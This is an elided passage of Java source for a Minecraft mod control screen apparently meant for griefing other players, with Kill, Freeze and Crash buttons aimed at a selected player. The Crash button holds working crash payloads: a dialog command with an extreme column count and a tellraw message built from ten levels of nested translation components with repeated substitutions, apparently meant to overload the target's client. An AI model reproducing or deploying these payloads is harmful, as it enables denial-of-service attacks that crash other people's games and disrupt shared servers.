...
public class FayCoreControlScreen extends Screen {
   ...
   protected void init() {
      ...
      this.KillButton = Button.builder(Component.literal("§7Kill"), button -> {
      ...
      this.addRenderableWidget(this.KillButton);
      this.FreezeButton = Button.builder(Component.literal("§7Freeze"), button -> {
         if (finalTargetUUID != null) {
      ...
      this.addRenderableWidget(this.FreezeButton);
      this.CrashButton = Button.builder(
            Component.literal("§7Crash"),
            button -> {
               if (finalTargetUUID != null) {
                  String DialogPayload = String.format(
                     "execute as %s at @s run dialog show @s {type:\"minecraft:multi_action\",body:[],title:{text:\"\"},inputs:[],columns:2147483647,actions:[{label:\"\"}]}",
                     finalTargetName
                  );
                  String TranslationPayload = String.format(
                     "tellraw %s {translate:\"%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s\",with:[{translate:\"%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s\",with:[{translate:\"%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s\",with:[{translate:\"%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s\",with:[{translate:\"%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s\",with:[{translate:\"%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s\",with:[{translate:\"%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s\",with:[{translate:\"%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s\",with:[{translate:\"%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s\",with:[{translate:\"%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s\",with:[{text:\"#############################\",obfuscated:true}]}]}]}]}]}]}]}]}]}]}",
                     finalTargetName
                  );
      ...
      this.CrashButton.setTooltip(Tooltip.create(Component.literal("§cTarget: §f" + TargetName + "\n§7UUID: §f" + TargetUUID)));
      this.addRenderableWidget(this.CrashButton);
   }
